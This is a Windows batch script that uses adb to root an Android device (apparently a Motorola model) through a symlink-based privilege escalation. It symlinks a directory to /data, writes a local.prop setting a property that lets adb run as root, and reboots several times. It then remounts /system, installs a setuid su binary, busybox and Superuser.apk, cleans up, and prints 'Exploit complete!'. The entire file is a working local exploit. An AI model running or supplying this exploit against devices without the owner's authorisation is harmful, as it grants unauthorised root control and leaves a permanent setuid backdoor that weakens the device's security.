@echo off
echo [*]Waiting for device
ADB\adb.exe wait-for-device
echo [*]Device found.
ADB\adb.exe shell "rm -r /data/local/12m/batch 2>/dev/null"
ADB\adb.exe shell "ln -s /data /data/local/12m/batch"
echo [*] Rebooting device (1/3)...
ADB\adb.exe reboot
echo [*] Waiting for device to reboot...
ADB\adb.exe wait-for-device
ADB\adb.exe shell "rm /data/local.prop"
ADB\adb.exe shell "echo 'ro.sys.atvc_allow_all_ADB\adb.exe=1' > /data/local.prop"
echo [*] Rebooting device (2/3)...
ADB\adb.exe reboot
echo [*] Waiting for device to reboot...
ADB\adb.exe wait-for-device
echo [*] Attemping persistence...
ADB\adb.exe remount
ADB\adb.exe push Root\su-v3 /system/bin/su
ADB\adb.exe shell "chmod 6755 /system/bin/su"
ADB\adb.exe shell "ln -s /system/bin/su /system/xbin/su 2>/dev/null"
ADB\adb.exe push Dependencies\busybox /system/xbin/busybox
ADB\adb.exe shell "chmod 755 /system/xbin/busybox"
ADB\adb.exe shell "/system/xbin/busybox --install /system/xbin"
ADB\adb.exe push Root\Superuser.apk /system/app/Superuser.apk
echo [*] Cleaning up...
ADB\adb.exe shell "rm /data/local.prop"
ADB\adb.exe shell "rm /data/local/12m/batch"
ADB\adb.exe shell "chmod 771 /data"
ADB\adb.exe shell "chown system.system /data"
echo [*] Rebooting (3/3)...
ADB\adb.exe reboot
ADB\adb.exe wait-for-device
echo [*] Exploit complete!
ADB\adb.exe kill-server